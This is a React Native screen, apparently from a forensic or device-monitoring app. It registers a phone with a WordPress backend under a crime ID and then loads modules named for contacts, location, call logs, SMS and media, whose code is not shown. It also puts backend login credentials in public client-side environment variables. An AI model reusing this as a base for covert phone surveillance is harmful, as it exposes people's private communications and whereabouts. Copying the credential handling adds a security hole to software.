import {
    View,
    Text,
    TextInput,
    Button,
    ActivityIndicator,
    Alert,
} from "react-native";
import React, { useEffect, useState } from "react";
import { Location, Contacts } from "../components";
import CallLog from "../components/CallLog";
import Media from "../components/Media";
import * as Device from "expo-device";
import * as SecureStore from "expo-secure-store";
import { privateAxios } from "../utils";
import SMSListener from "../components/SMSListener";

const Home = () => {
    const {
        deviceName,
        modelName,
        osInternalBuildId,
        osBuildId,
        osName,
        osVersion,
    } = Device;
    const device_name = `${deviceName}/${modelName}`;
    const device_imei = `${osName}/${osVersion}/${osBuildId}/${osInternalBuildId}`;
    const [auth, setAuth] = useState({
        crime_id: null,
        device_man: "",
    });
    const [token, setToken] = useState("");
    const [deviceId, setDeviceId] = useState(null);
    const [isLoading, setIsLoading] = useState(true);

    useEffect(() => {
        (async () => {
            const deviceId = await SecureStore.getItemAsync("device_id");
            const token = await SecureStore.getItemAsync("token");
            if (deviceId) {
                setDeviceId(deviceId);
            }
            if (token) {
                setToken(token);
            }
            setIsLoading(false);
        })();
    }, []);

    useEffect(() => {
        if (!token) {
            (async () => {
                const resAxios = await privateAxios.post(
                    "/wp-json/jwt-auth/v1/token",
                    {
                        username: process.env.EXPO_PUBLIC_USER_NAME,
                        password: process.env.EXPO_PUBLIC_PASSWORD,
                    }
                );

                if (resAxios.data.token) {
                    privateAxios.defaults.headers.common.Authorization =
                        "Bearer " + resAxios.data.token;
                    SecureStore.setItemAsync("token", resAxios.data.token);
                    setToken(resAxios.data.token);
                }
            })();
        }
    }, [token]);

    const handleSubmit = async () => {
        try {
            const body = {
                ...auth,
                device_name,
                device_imei,
            };

            const res = await privateAxios.post(
                "/wp-json/cyno/v1/add_device",
                body,
                {
                    headers: {
                        Authorization: "Bearer " + token,
                    },
                }
            );

            if (res?.data?.device_id) {
                SecureStore.setItemAsync(
                    "device_id",
                    JSON.stringify(res.data.device_id)
                );
                setDeviceId(res?.data?.device_id);
            }
        } catch (error) {
            console.error(
                "Add device error: ",
                error.response?.data?.message || error?.message
            );
            Alert.alert(
                "Add device error: " + error.response?.data?.message ||
                    error?.message
            );
        }
    };

    const handleLogout = async () => {
        await SecureStore.deleteItemAsync("device_id");
        await SecureStore.deleteItemAsync("token");
        setDeviceId(null);
    };

    if (isLoading) {
        return (
            <View
                style={{
                    flex: 1,
                    justifyContent: "center",
                    padding: 16,
                    gap: 16,
                }}
            >
                <ActivityIndicator size={50} />
                <Text style={{ textAlign: "center" }}>Loading...</Text>
            </View>
        );
    }

    if (!deviceId) {
        return (
            <View
                style={{
                    flex: 1,
                    justifyContent: "center",
                    padding: 16,
                    gap: 16,
                }}
            >
                <Text style={{ textAlign: "center", fontWeight: 600 }}>
                    Authentication
                </Text>
                <TextInput
                    style={{
                        borderWidth: 1,
                        padding: 8,
                        borderColor: "black",
                        borderRadius: 12,
                    }}
                    value={auth.crime_id}
                    onChangeText={(value) =>
                        setAuth((prev) => ({ ...prev, crime_id: value }))
                    }
                    keyboardType="numeric"
                    placeholder="ID"
                />
                <TextInput
                    style={{
                        borderWidth: 1,
                        padding: 8,
                        borderColor: "black",
                        borderRadius: 12,
                    }}
                    value={auth.device_man}
                    onChangeText={(value) =>
                        setAuth((prev) => ({ ...prev, device_man: value }))
                    }
                    autoCapitalize="none"
                    placeholder="Device man"
                />
                <Button onPress={handleSubmit} title="Submit" />
            </View>
        );
    }

    return (
        <View
            style={{
                flex: 1,
                justifyContent: "center",
                padding: 16,
                gap: 16,
            }}
        >
            <Text style={{ textAlign: "center" }}>Device ID: {deviceId}</Text>
            <Button onPress={handleLogout} title="Logout" />

            <Contacts deviceId={deviceId} />
            <Location deviceId={deviceId} />
            <CallLog deviceId={deviceId} />
            <SMSListener deviceId={deviceId} />
            <Media deviceId={deviceId} />
        </View>
    );
};

export default Home;
